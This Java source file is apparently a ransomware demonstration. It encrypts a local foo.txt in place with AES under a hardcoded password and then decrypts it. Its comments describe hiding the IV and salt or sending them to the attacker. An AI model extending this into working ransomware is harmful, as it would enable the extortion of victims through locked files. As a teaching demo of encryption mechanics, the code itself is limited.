package com.demo.ransomware;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class Ransomware {

    private static AESEncryption encryptor = AESEncryption.getInstance("1234"); //Password can be passed as param

    public static void main(String[] args) throws IOException {
        //Before exec create a file foo.txt with some dummy text
        var file = new File("./foo.txt");

        encryptFile(file);
        System.out.println("---Text encrypted---");
        System.out.println(new String(Files.readAllBytes(file.toPath())));
        System.out.println("------");

        decryptFile(file);
        System.out.println("--Text decrypted--");
        System.out.println(new String(Files.readAllBytes(file.toPath())));
        System.out.println("------");


        //these bytes needs to be saved in order to decrypt
        //use this encryptor.getIVInBase64() to save the bytes in a hidden file or send them to you
        //use this encryptor.getSaltBytesInBase64() to save the bytes in a hidden file or send them to you
        //finally when decryption, pass those bytes and the password
    }

    private static void encryptFile(File file) {
        try {
            var content = Files.readAllBytes(file.toPath());
            var encryptedBytes = encryptor.encryptBytes(content);
            Files.write(file.toPath(), encryptedBytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void decryptFile(File file) {
        try {
            var cipherContent = Files.readAllBytes(file.toPath());
            var decryptedBytes = encryptor.decryptBytes(cipherContent);
            Files.write(file.toPath(), decryptedBytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
